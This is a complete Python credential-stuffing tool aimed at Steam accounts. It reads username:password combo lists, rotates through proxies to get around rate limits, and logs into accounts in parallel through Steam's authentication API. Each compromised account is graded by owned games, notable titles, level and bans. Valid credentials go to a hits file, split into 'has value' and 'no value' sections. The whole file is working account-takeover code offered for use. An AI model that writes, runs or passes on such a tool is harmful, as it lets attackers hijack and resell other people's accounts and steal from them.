#!/usr/bin/env python3
"""steam_chk — Steam account checker with game library display

Auth flow (new Steam API, no browser automation):
  1. GET  store.steampowered.com/login/            → seed session cookie
  2. POST GetPasswordRSAPublicKey                  → RSA public key (mod, exp, timestamp)
  3. RSA PKCS#1 v1.5 encrypt password             (pure Python, zero extra deps)
  4. POST BeginAuthSessionViaCredentials           → steamid / client_id / request_id
     └─ eresult 5 / 18 → BAD  (wrong password / account not found)
     └─ guard type 6 / 8 → GUARD hit (email / mobile 2FA — valid creds, locked)
  5. POST PollAuthSessionStatus                   → access_token
  6. GET  IPlayerService/GetOwnedGames            → game count + game names
  7. GET  IPlayerService/GetSteamLevel            → level
  8. GET  ISteamUser/GetPlayerSummaries           → country, persona name
  9. GET  ISteamUser/GetPlayerBans                → VAC bans, trade ban
"""

import os
import sys
import json
import time
import base64
import itertools
import urllib.parse
import urllib.request
import urllib.error
from http.cookiejar import CookieJar
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from rich.console import Console
from rich.progress import (
    Progress, BarColumn, SpinnerColumn,
    TextColumn, TimeElapsedColumn, MofNCompleteColumn,
)
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console(highlight=False)

# ── Constants ─────────────────────────────────────────────────────────────────

_RSA_URL     = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
_BEGIN_URL   = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
_POLL_URL    = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
_GAMES_URL   = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
_LEVEL_URL   = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
_SUMMARY_URL = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/"
_BANS_URL    = "https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/"
_LOGIN_PAGE  = "https://store.steampowered.com/login/"
_STORE_URL   = "https://store.steampowered.com/api/appdetails/"

_CFG_PATH  = os.path.join(os.path.dirname(__file__), ".steam_cfg.json")
_HITS_PATH = os.path.join(os.path.dirname(__file__), "hits.txt")

_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

_BASE_HDRS = {
    "User-Agent":      _UA,
    "Accept":          "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin":          "https://store.steampowered.com",
    "Referer":         "https://store.steampowered.com/login/",
}

# Steam EResult codes
_ERESULT_OK          = 1
_ERESULT_INVALID_PW  = 5
_ERESULT_ACCOUNT_404 = 18
_ERESULT_RATE_LIMIT  = 84

# Steam Guard confirmation types
_GUARD_NONE_TYPES  = {0, 1}
_GUARD_EMAIL       = 2
_GUARD_DEVICE      = 3
_GUARD_DEVICE_CONF = 4

_MAX_POLL    = 3
_POLL_DELAY  = 2.0

# Game categories for filtering
_GAME_CATEGORIES = {
    "action":      ["action", "shooter", "fighting", "hack and slash"],
    "rpg":         ["rpg", "role-playing"],
    "strategy":    ["strategy", "rts", "turn-based"],
    "sports":      ["sports", "racing", "football", "soccer"],
    "adventure":   ["adventure", "exploration"],
    "simulation":  ["simulation", "building", "farming"],
    "horror":      ["horror", "survival horror"],
    "indie":       ["indie"],
}

# Notable/valuable games by appid (add more as needed)
_NOTABLE_GAMES = {
    730:    "CS2",
    570:    "Dota 2",
    440:    "TF2",
    578080: "PUBG",
    252490: "Rust",
    1172470:"Apex Legends",
    1245620:"Elden Ring",
    1091500:"Cyberpunk 2077",
    292030: "The Witcher 3",
    1938090:"Call of Duty HQ",
    359550: "Rainbow Six Siege",
    381210: "Dead by Daylight",
    311210: "Call of Duty: Black Ops III",
    218620: "PAYDAY 2",
    346110: "ARK",
    413150: "Stardew Valley",
    49520:  "Borderlands 2",
    105600: "Terraria",
    400:    "Portal",
    620:    "Portal 2",
}

# ── Locks ─────────────────────────────────────────────────────────────────────

_hits_lock  = Lock()
_proxy_lock = Lock()

# ── RSA helpers ───────────────────────────────────────────────────────────────

def _rsa_encrypt(password: str, mod_hex: str, exp_hex: str) -> str:
    mod     = int(mod_hex, 16)
    exp     = int(exp_hex, 16)
    key_len = (mod.bit_length() + 7) // 8
    msg     = password.encode("utf-8")
    if len(msg) > key_len - 11:
        raise ValueError("Password too long for RSA key size")
    pad_len = key_len - len(msg) - 3
    ps = bytearray()
    while len(ps) < pad_len:
        ps.extend(b for b in os.urandom(pad_len * 2) if b != 0)
    ps = bytes(ps[:pad_len])
    em = b"\x00\x02" + ps + b"\x00" + msg
    c  = pow(int.from_bytes(em, "big"), exp, mod)
    return base64.b64encode(c.to_bytes(key_len, "big")).decode("ascii")

# ── Proxy helpers ─────────────────────────────────────────────────────────────

class ProxyRotator:
    def __init__(self, proxies: list):
        self._cycle = itertools.cycle(proxies) if proxies else itertools.cycle([None])

    def next(self):
        with _proxy_lock:
            return next(self._cycle)


def _make_opener(proxy_url):
    jar      = CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    if proxy_url:
        handlers.append(
            urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
        )
    return urllib.request.build_opener(*handlers)


def _mask_proxy(proxy_url):
    if not proxy_url:
        return "direct"
    import re
    return re.sub(r"(://[^:]+):([^@]+)@", r"\1:***@", proxy_url)


def _load_proxy_file(path: str) -> list:
    proxies = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    if "://" not in line:
                        line = "http://" + line
                    proxies.append(line)
    except FileNotFoundError:
        console.print(f"  [bold red]✗[/bold red] Proxy file not found: {path}")
    return proxies

# ── Low-level HTTP ────────────────────────────────────────────────────────────

def _post_form(opener, url: str, form: dict, timeout: int = 20):
    data = urllib.parse.urlencode(form).encode()
    req  = urllib.request.Request(url, data=data, headers=dict(_BASE_HDRS))
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _get_json(opener, url: str, params: dict, timeout: int = 20):
    full = url + "?" + urllib.parse.urlencode(params)
    req  = urllib.request.Request(full, headers=dict(_BASE_HDRS))
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

# ── Account info extractors ───────────────────────────────────────────────────

def _get_games(opener, access_token: str, steamid: str, timeout: int) -> tuple:
    """Returns (game_count, games_list) where games_list has appid, name, playtime."""
    s, r = _get_json(opener, _GAMES_URL, {
        "access_token":              access_token,
        "steamid":                   steamid,
        "include_appinfo":           "true",   # ← Get game names
        "include_played_free_games": "false",
    }, timeout)
    if s != 200:
        return -1, []

    response  = r.get("response") or {}
    game_count = response.get("game_count", 0)
    games_raw  = response.get("games") or []

    games_list = []
    for g in games_raw:
        games_list.append({
            "appid":    g.get("appid", 0),
            "name":     g.get("name", f"AppID {g.get('appid', '?')}"),
            "playtime": g.get("playtime_forever", 0),  # minutes
        })

    # Sort by playtime descending
    games_list.sort(key=lambda x: x["playtime"], reverse=True)
    return game_count, games_list


def _get_level(opener, access_token: str, steamid: str, timeout: int) -> int:
    s, r = _get_json(opener, _LEVEL_URL, {
        "access_token": access_token,
        "steamid":      steamid,
    }, timeout)
    if s != 200:
        return -1
    return (r.get("response") or {}).get("player_level", 0)


def _get_summary(opener, access_token: str, steamid: str, timeout: int) -> dict:
    s, r = _get_json(opener, _SUMMARY_URL, {
        "key":      access_token,
        "steamids": steamid,
    }, timeout)
    if s != 200:
        return {}
    players = (r.get("response") or {}).get("players") or []
    return players[0] if players else {}


def _get_bans(opener, access_token: str, steamid: str, timeout: int) -> dict:
    s, r = _get_json(opener, _BANS_URL, {
        "key":      access_token,
        "steamids": steamid,
    }, timeout)
    if s != 200:
        return {}
    players = (r.get("response") or {}).get("players") or []
    return players[0] if players else {}


def _format_playtime(minutes: int) -> str:
    """Convert minutes to human readable format."""
    if minutes == 0:
        return "Never played"
    if minutes < 60:
        return f"{minutes}m"
    hours = minutes // 60
    mins  = minutes % 60
    if hours >= 1000:
        return f"{hours:,}h"
    return f"{hours}h {mins}m"


def _get_notable_games(games_list: list) -> list:
    """Return list of notable games found in library."""
    found = []
    game_ids = {g["appid"] for g in games_list}
    for appid, name in _NOTABLE_GAMES.items():
        if appid in game_ids:
            # Find playtime for this game
            for g in games_list:
                if g["appid"] == appid:
                    found.append({
                        "appid":    appid,
                        "name":     name,
                        "playtime": g["playtime"],
                    })
                    break
    return found

# ── Core account checker ──────────────────────────────────────────────────────

def check_account(
    username: str,
    password: str,
    proxy_url,
    timeout: int = 20,
    show_games: bool = True,
) -> dict:
    opener = _make_opener(proxy_url)
    result = {"username": username, "password": password, "proxy": proxy_url}

    # Step 1: Seed session cookie
    try:
        req = urllib.request.Request(_LOGIN_PAGE, headers=dict(_BASE_HDRS))
        opener.open(req, timeout=timeout).close()
    except Exception:
        pass

    # Step 2: Get RSA public key
    s, r = _get_json(opener, _RSA_URL, {"account_name": username}, timeout)
    rsa = (r.get("response") or {})
    if s != 200 or not rsa.get("publickey_mod"):
        return {**result, "status": "ERROR", "reason": f"RSA key: HTTP {s}"}

    # Step 3: Encrypt password
    try:
        enc_pass = _rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except Exception as exc:
        return {**result, "status": "ERROR", "reason": f"RSA encrypt: {exc}"}

    # Step 4: Begin auth session
    s, r = _post_form(opener, _BEGIN_URL, {
        "account_name":         username,
        "encrypted_password":   enc_pass,
        "encryption_timestamp": rsa["timestamp"],
        "remember_login":       "true",
        "persistence":          "1",
        "website_id":           "Store",
    }, timeout)

    resp    = r.get("response") or {}
    eresult = resp.get("eresult", 0)

    if eresult in (_ERESULT_INVALID_PW, _ERESULT_ACCOUNT_404) or s == 401:
        return {**result, "status": "BAD"}

    if s == 200 and not resp:
        return {**result, "status": "BAD"}

    if eresult == _ERESULT_RATE_LIMIT:
        return {**result, "status": "ERROR", "reason": "rate-limited"}

    if not resp.get("client_id"):
        reason = resp.get("error_message") or f"BeginAuth HTTP {s} eresult {eresult}"
        return {**result, "status": "ERROR", "reason": reason}

    steamid    = str(resp.get("steamid", ""))
    client_id  = str(resp.get("client_id", ""))
    request_id = resp.get("request_id", "")

    # Detect Steam Guard
    confirmations = resp.get("allowed_confirmations") or []
    guard_types   = {int(c.get("confirmation_type", 0)) for c in confirmations}
    has_guard     = bool(guard_types - _GUARD_NONE_TYPES)

    if _GUARD_DEVICE in guard_types or _GUARD_DEVICE_CONF in guard_types:
        guard_label = "Mobile"
    elif _GUARD_EMAIL in guard_types:
        guard_label = "Email"
    else:
        guard_label = "None"

    if has_guard:
        return {
            **result,
            "status":     "HIT",
            "steamid":    steamid,
            "has_value":  False,
            "guard":      guard_label,
            "games_list": [],
            "plan": (
                f"Guard = {guard_label} | Country = N/A | "
                f"Level = N/A | Games = N/A | VACBans = N/A | Tradeban = N/A"
            ),
        }

    # Step 5: Poll for access token
    access_token = None
    for attempt in range(_MAX_POLL):
        s, r = _post_form(opener, _POLL_URL, {
            "client_id":  client_id,
            "request_id": request_id,
        }, timeout)
        pr = r.get("response") or {}
        if pr.get("access_token"):
            access_token = pr["access_token"]
            break
        if attempt < _MAX_POLL - 1:
            time.sleep(_POLL_DELAY)

    if not access_token:
        return {**result, "status": "ERROR", "reason": "poll: no access_token"}

    # Steps 6-9: Gather account info
    game_count, games_list = _get_games(opener, access_token, steamid, timeout)
    level                  = _get_level(opener, access_token, steamid, timeout)
    summary                = _get_summary(opener, access_token, steamid, timeout)
    bans                   = _get_bans(opener, access_token, steamid, timeout)

    country   = (summary.get("loccountrycode") or "N/A").upper()
    persona   = summary.get("personaname", "N/A")
    vac_bans  = bans.get("NumberOfVACBans", 0)
    trade_ban = str(bans.get("EconomyBan", "none") != "none").lower()
    limited   = str(level == 0 and game_count == 0).lower()
    games_str = str(game_count) if game_count >= 0 else "N/A"
    level_str = str(level)      if level      >= 0 else "N/A"
    has_value = game_count > 0

    # Notable games check
    notable = _get_notable_games(games_list)

    plan = (
        f"Guard = None | Country = {country} | "
        f"Level = {level_str} | Games = {games_str} | "
        f"VACBans = {vac_bans} | Tradeban = {trade_ban} | Limited = {limited}"
    )

    return {
        **result,
        "status":       "HIT",
        "steamid":      steamid,
        "persona":      persona,
        "country":      country,
        "level":        level,
        "game_count":   game_count,
        "games_list":   games_list,
        "notable":      notable,
        "vac_bans":     vac_bans,
        "trade_ban":    trade_ban,
        "limited":      limited,
        "guard":        guard_label,
        "has_value":    has_value,
        "plan":         plan,
    }

# ── Game display ──────────────────────────────────────────────────────────────

def _print_game_library(res: dict, max_display: int = 20) -> None:
    """Print a formatted game library table for a hit account."""
    games_list = res.get("games_list") or []
    notable    = res.get("notable") or []
    username   = res.get("username", "")
    game_count = res.get("game_count", 0)

    if not games_list:
        return

    console.print()

    # ── Notable games panel ───────────────────────────────────────────────────
    if notable:
        notable_lines = []
        for g in notable:
            pt = _format_playtime(g["playtime"])
            notable_lines.append(f"  🎮 [bold cyan]{g['name']}[/bold cyan]  [dim]({pt})[/dim]")
        console.print(
            Panel(
                "\n".join(notable_lines),
                title=f"[bold yellow]⭐ Notable Games — {username}[/bold yellow]",
                border_style="yellow",
                padding=(0, 1),
            )
        )

    # ── Full library table ────────────────────────────────────────────────────
    table = Table(
        title=f"🎮 Game Library — {username} ({game_count} games)",
        box=box.SIMPLE_HEAVY,
        show_lines=False,
        title_style="bold green",
        header_style="bold white",
        border_style="dim",
    )

    table.add_column("#",          style="dim",        width=4,  justify="right")
    table.add_column("Game Name",  style="cyan",       min_width=30)
    table.add_column("App ID",     style="dim blue",   width=10, justify="right")
    table.add_column("Playtime",   style="green",      width=14, justify="right")
    table.add_column("Notable",    style="yellow",     width=8,  justify="center")

    notable_ids = {g["appid"] for g in notable}
    display     = games_list[:max_display]

    for i, g in enumerate(display, 1):
        pt         = _format_playtime(g["playtime"])
        is_notable = "⭐" if g["appid"] in notable_ids else ""
        table.add_row(
            str(i),
            g["name"],
            str(g["appid"]),
            pt,
            is_notable,
        )

    if len(games_list) > max_display:
        table.add_row(
            "...",
            f"[dim]... and {len(games_list) - max_display} more games[/dim]",
            "",
            "",
            "",
        )

    console.print(table)

    # ── Top played summary ────────────────────────────────────────────────────
    top5 = [g for g in games_list if g["playtime"] > 0][:5]
    if top5:
        console.print("  [bold]Top Played:[/bold] ", end="")
        parts = []
        for g in top5:
            parts.append(f"[cyan]{g['name']}[/cyan] [dim]({_format_playtime(g['playtime'])})[/dim]")
        console.print(" · ".join(parts))
    console.print()

# ── Output + save ─────────────────────────────────────────────────────────────

def _print_result(res: dict, verbose: bool = True, show_games: bool = False) -> None:
    status = res.get("status")
    u = res.get("username", "")
    p = res.get("password", "")

    if status == "HIT":
        plan = res.get("plan", "")
        tag  = "[bold green]HIT[/bold green]" if res.get("has_value") else "[bold yellow]HIT[/bold yellow]"
        console.print(f"  {tag}  [white]{u}:{p}[/white]  [dim]→[/dim]  [cyan]{plan}[/cyan]")
        if show_games and res.get("has_value"):
            _print_game_library(res)
    elif status == "BAD":
        if verbose:
            console.print(f"  [bold red]BAD[/bold red]  [dim]{u}:{p}[/dim]")
    else:
        reason = res.get("reason", "")
        if verbose:
            console.print(
                f"  [bold yellow]ERR[/bold yellow]  "
                f"[dim]{u}:{p}  ({reason})[/dim]"
            )


def _section_header(title: str, width: int = 50) -> str:
    inner  = f" {title} "
    dashes = width - len(inner)
    left   = dashes // 2
    right  = dashes - left
    return "-" * left + inner + "-" * right


def _print_sections(value_hits: list, no_value_hits: list, show_games: bool = False) -> None:
    console.print()
    console.print(f"[bold yellow]{_section_header('No Value')}[/bold yellow]")
    if no_value_hits:
        for i, res in enumerate(no_value_hits, 1):
            console.print(
                f"[yellow]{i}. {res['username']}:{res['password']} | {res.get('plan', 'N/A')}[/yellow]"
            )
    else:
        console.print("[dim](none)[/dim]")

    console.print()
    console.print(f"[bold green]{_section_header('Has Value')}[/bold green]")
    if value_hits:
        for i, res in enumerate(value_hits, 1):
            console.print(
                f"[green]{i}. {res['username']}:{res['password']} | {res.get('plan', 'N/A')}[/green]"
            )
            if show_games:
                _print_game_library(res)
    else:
        console.print("[dim](none)[/dim]")
    console.print()


def _write_hits_file(value_hits: list, no_value_hits: list) -> None:
    if not value_hits and not no_value_hits:
        return
    with _hits_lock:
        with open(_HITS_PATH, "w", encoding="utf-8") as f:

            f.write(_section_header("No Value") + "\n")
            if no_value_hits:
                for i, res in enumerate(no_value_hits, 1):
                    f.write(
                        f"{i}. {res['username']}:{res['password']} | {res.get('plan', 'N/A')}\n"
                    )
            else:
                f.write("(none)\n")
            f.write("\n")

            f.write(_section_header("Has Value") + "\n")
            if value_hits:
                for i, res in enumerate(value_hits, 1):
                    f.write(
                        f"{i}. {res['username']}:{res['password']} | {res.get('plan', 'N/A')}\n"
                    )
                    # Write game library to file
                    games_list = res.get("games_list") or []
                    if games_list:
                        f.write(f"   Games ({len(games_list)} total):\n")
                        for j, g in enumerate(games_list, 1):
                            pt = _format_playtime(g["playtime"])
                            notable_mark = " ⭐" if g["appid"] in _NOTABLE_GAMES else ""
                            f.write(f"     {j:3}. {g['name']}{notable_mark}  [{pt}]\n")
                        f.write("\n")
            else:
                f.write("(none)\n")

# ── Bulk runner ───────────────────────────────────────────────────────────────

def run_bulk(
    accounts: list,
    rotator: "ProxyRotator",
    workers: int = 5,
    timeout: int = 20,
    check_delay: float = 1.0,
    show_games: bool = False,
) -> tuple:
    hits = bad = errors = 0
    value_hits:    list = []
    no_value_hits: list = []
    total = len(accounts)

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]Checking[/bold blue]"),
        BarColumn(),
        MofNCompleteColumn(),
        TextColumn(
            "[green]{task.fields[hits]}H[/green] "
            "[red]{task.fields[bad]}B[/red] "
            "[yellow]{task.fields[err]}E[/yellow]"
        ),
        TimeElapsedColumn(),
        console=console, transient=False,
    ) as progress:
        task = progress.add_task("checking", total=total, hits=0, bad=0, err=0)

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {}
            for user, pw in accounts:
                fut = pool.submit(check_account, user, pw, rotator.next(), timeout)
                futures[fut] = (user, pw)
                if check_delay > 0:
                    time.sleep(check_delay)

            for fut in as_completed(futures):
                res = fut.result()
                st  = res.get("status")
                if st == "HIT":
                    hits += 1
                    if res.get("has_value"):
                        value_hits.append(res)
                    else:
                        no_value_hits.append(res)
                elif st == "BAD":
                    bad += 1
                else:
                    errors += 1
                _print_result(res, verbose=(st != "BAD"), show_games=show_games)
                progress.update(task, advance=1, hits=hits, bad=bad, err=errors)

    _print_sections(value_hits, no_value_hits, show_games=show_games)
    _write_hits_file(value_hits, no_value_hits)
    return hits, bad, errors

# ── Combo parsing ─────────────────────────────────────────────────────────────

def _parse_combo_line(line: str):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    parts = line.split(":", 1)
    if len(parts) != 2:
        return None
    user, pw = parts[0].strip(), parts[1].strip()
    if not user or not pw:
        return None
    return user, pw


def _load_combos_file(path: str) -> list:
    combos = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                c = _parse_combo_line(line)
                if c:
                    combos.append(c)
    except FileNotFoundError:
        console.print(f"  [bold red]✗[/bold red] File not found: {path}")
    return combos

# ── Config ────────────────────────────────────────────────────────────────────

_DEFAULT_CFG = {
    "workers":         5,
    "timeout":         20,
    "check_delay":     1.0,
    "proxy_mode":      "direct",
    "proxy_url":       "",
    "proxy_list_path": "",
    "show_games":      True,
    "max_games_shown": 20,
}


def load_config() -> dict:
    try:
        with open(_CFG_PATH, "r") as f:
            saved = json.load(f)
        return {**_DEFAULT_CFG, **saved}
    except Exception:
        return dict(_DEFAULT_CFG)


def save_config(cfg: dict) -> None:
    try:
        with open(_CFG_PATH, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


def _build_rotator(cfg: dict) -> "ProxyRotator":
    mode = cfg.get("proxy_mode", "direct")
    if mode == "direct":
        return ProxyRotator([None])
    if mode == "list":
        path    = cfg.get("proxy_list_path", "")
        proxies = _load_proxy_file(path)
        if not proxies:
            console.print("  [yellow]![/yellow] Proxy list empty — falling back to direct")
            return ProxyRotator([None])
        console.print(f"  [cyan]•[/cyan] Loaded [bold]{len(proxies)}[/bold] proxies from list")
        return ProxyRotator(proxies)
    url = cfg.get("proxy_url", "").strip()
    if not url:
        console.print("  [bold red]✗[/bold red] No proxy configured. Set one in Settings → Proxy URL.")
        raise ValueError("proxy_url not set")
    return ProxyRotator([url])

# ── Banner ────────────────────────────────────────────────────────────────────

_BANNER = r"""[bold cyan]
  ███████╗████████╗███████╗ █████╗ ███╗   ███╗
  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
  ███████╗   ██║   █████╗  ███████║██╔████╔██║
  ╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
  ███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
  ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
[/bold cyan][dim]                   Steam Checker  v2.0[/dim]
[italic dim]                      + Game Library[/italic dim]
"""

# ── CLI ───────────────────────────────────────────────────────────────────────

def _banner_stats(cfg: dict) -> None:
    console.print(_BANNER)
    mode = cfg.get("proxy_mode", "direct")
    url  = cfg.get("proxy_url", "").strip()
    if mode == "residential":
        pstr = _mask_proxy(url) if url else "[bold red]not set[/bold red]"
    elif mode == "list":
        pstr = cfg.get("proxy_list_path") or "[bold red]no file set[/bold red]"
    else:
        pstr = "direct (no proxy)"

    console.print(f"  [bold]Proxy[/bold]     : {pstr}")
    console.print(f"  [bold]Workers[/bold]   : [cyan]{cfg['workers']}[/cyan]")
    console.print(f"  [bold]Timeout[/bold]   : [cyan]{cfg['timeout']}s[/cyan]")
    console.print(f"  [bold]Delay[/bold]     : [cyan]{cfg.get('check_delay', 1.0)}s[/cyan]")
    console.print(f"  [bold]Show Games[/bold]: [cyan]{'Yes' if cfg.get('show_games', True) else 'No'}[/cyan]  "
                  f"[dim](max {cfg.get('max_games_shown', 20)} shown)[/dim]")
    console.print()


def _settings_menu(cfg: dict) -> dict:
    cfg = dict(cfg)
    console.print("\n[bold]Settings[/bold]")
    console.print(f"  1. Workers       [{cfg['workers']}]")
    console.print(f"  2. Timeout       [{cfg['timeout']}s]")
    console.print(f"  3. Proxy mode    [{cfg['proxy_mode']}]  (residential / list / direct)")
    console.print(f"  4. Proxy URL     [{cfg['proxy_url']}]")
    console.print(f"  5. Proxy list    [{cfg['proxy_list_path'] or 'none'}]")
    console.print(f"  6. Check delay   [{cfg.get('check_delay', 1.0)}s]")
    console.print(f"  7. Show games    [{'yes' if cfg.get('show_games', True) else 'no'}]")
    console.print(f"  8. Max games     [{cfg.get('max_games_shown', 20)}]  (how many to display per account)")
    console.print("  0. Back")
    choice = input("\n  Choice > ").strip()

    if choice == "1":
        v = input(f"  Workers [{cfg['workers']}] > ").strip()
        if v.isdigit() and int(v) > 0:
            cfg["workers"] = int(v)

    elif choice == "2":
        v = input(f"  Timeout [{cfg['timeout']}] > ").strip()
        if v.isdigit() and int(v) > 0:
            cfg["timeout"] = int(v)

    elif choice == "3":
        v = input("  Mode (residential/list/direct) > ").strip().lower()
        if v in ("residential", "list", "direct"):
            cfg["proxy_mode"] = v

    elif choice == "4":
        console.print("  Formats: [cyan]host:port:user:pass[/cyan]  or  [cyan]http://user:pass@host:port[/cyan]")
        raw = input("  Proxy URL > ").strip()
        if raw:
            if "://" not in raw:
                parts = raw.split(":")
                raw = (
                    f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                    if len(parts) == 4 else "http://" + raw
                )
            cfg["proxy_url"] = raw
            console.print(f"  [green]Saved:[/green] {_mask_proxy(raw)}")

    elif choice == "5":
        v = input("  Proxy list path > ").strip()
        cfg["proxy_list_path"] = v

    elif choice == "6":
        v = input(f"  Check delay [{cfg.get('check_delay', 1.0)}] > ").strip()
        try:
            fv = float(v)
            if fv >= 0:
                cfg["check_delay"] = fv
        except ValueError:
            pass

    elif choice == "7":
        v = input("  Show games (yes/no) > ").strip().lower()
        if v in ("yes", "y"):
            cfg["show_games"] = True
        elif v in ("no", "n"):
            cfg["show_games"] = False

    elif choice == "8":
        v = input(f"  Max games shown [{cfg.get('max_games_shown', 20)}] > ").strip()
        if v.isdigit() and int(v) > 0:
            cfg["max_games_shown"] = int(v)

    save_config(cfg)
    return cfg


def _ensure_proxy(cfg: dict) -> dict:
    mode = cfg.get("proxy_mode", "direct")
    if mode == "direct":
        return cfg
    if mode == "list" and cfg.get("proxy_list_path"):
        return cfg
    if mode == "residential" and cfg.get("proxy_url", "").strip():
        return cfg
    console.print("\n  [bold yellow]No proxy configured.[/bold yellow]")
    raw = input("  Enter proxy (or press Enter to use direct) > ").strip()
    if not raw:
        cfg = {**cfg, "proxy_mode": "direct"}
        save_config(cfg)
        return cfg
    if "://" not in raw:
        parts = raw.split(":")
        raw = (
            f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            if len(parts) == 4 else "http://" + raw
        )
    cfg = {**cfg, "proxy_url": raw, "proxy_mode": "residential"}
    save_config(cfg)
    console.print(f"  [green]Proxy saved:[/green] {_mask_proxy(raw)}\n")
    return cfg


def main() -> None:
    cfg = load_config()

    while True:
        _banner_stats(cfg)
        console.print("  [bold]1.[/bold] Check combo file")
        console.print("  [bold]2.[/bold] Check single account")
        console.print("  [bold]3.[/bold] Settings")
        console.print("  [bold]0.[/bold] Exit\n")

        choice = input("  > ").strip()

        if choice == "0":
            break

        elif choice == "3":
            cfg = _settings_menu(cfg)

        elif choice == "1":
            cfg      = _ensure_proxy(cfg)
            path     = input("  Combo file path > ").strip()
            if not path:
                path = os.path.join(os.path.dirname(__file__), "combo.txt")
            accounts = _load_combos_file(path)
            if not accounts:
                console.print("  [red]No valid combos found.[/red]")
                continue
            console.print(f"\n  [cyan]Loaded {len(accounts)} combos[/cyan]")
            try:
                rotator = _build_rotator(cfg)
            except ValueError:
                continue
            t0 = time.time()
            hits, bad, errors = run_bulk(
                accounts, rotator,
                workers=cfg["workers"],
                timeout=cfg["timeout"],
                check_delay=cfg.get("check_delay", 1.0),
                show_games=cfg.get("show_games", True),
            )
            elapsed = time.time() - t0
            console.print(
                f"\n  [bold]Done[/bold] in [cyan]{elapsed:.1f}s[/cyan]  "
                f"[green]{hits} hits[/green]  "
                f"[red]{bad} bad[/red]  "
                f"[yellow]{errors} errors[/yellow]"
            )
            if hits:
                console.print(f"  [green]Hits saved to:[/green] {_HITS_PATH}")
            input("\n  Press Enter to continue...")

        elif choice == "2":
            cfg   = _ensure_proxy(cfg)
            combo = input("  username:password > ").strip()
            parsed = _parse_combo_line(combo)
            if not parsed:
                console.print("  [red]Invalid format. Use username:password[/red]")
                continue
            user, pw = parsed
            try:
                rotator = _build_rotator(cfg)
            except ValueError:
                continue
            console.print(f"\n  Checking [cyan]{user}[/cyan] …")
            res = check_account(user, pw, rotator.next(), cfg["timeout"])
            _print_result(res, verbose=True, show_games=cfg.get("show_games", True))
            if res.get("status") == "HIT":
                value    = [res] if res.get("has_value") else []
                no_value = [] if res.get("has_value") else [res]
                _print_sections(value, no_value, show_games=cfg.get("show_games", True))
                _write_hits_file(value, no_value)
                console.print(f"  [green]Saved to:[/green] {_HITS_PATH}")
            input("\n  Press Enter to continue...")

        else:
            console.print("  [yellow]Unknown option[/yellow]")


if __name__ == "__main__":
    main()